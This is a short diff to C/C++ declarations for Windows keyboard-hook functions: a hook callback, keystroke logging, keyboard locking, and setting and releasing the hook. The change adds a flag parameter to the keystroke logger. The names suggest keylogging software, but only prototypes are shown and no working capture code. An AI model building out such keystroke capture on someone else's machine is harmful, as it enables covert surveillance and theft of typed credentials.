@@ -15,7 +15,7 @@
 #include "utils.h"
 
 LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
-void logKeystroke(int);
+void logKeystroke(int, bool);
 void lockKeyboard();
 bool releaseHook();
 bool setHook();
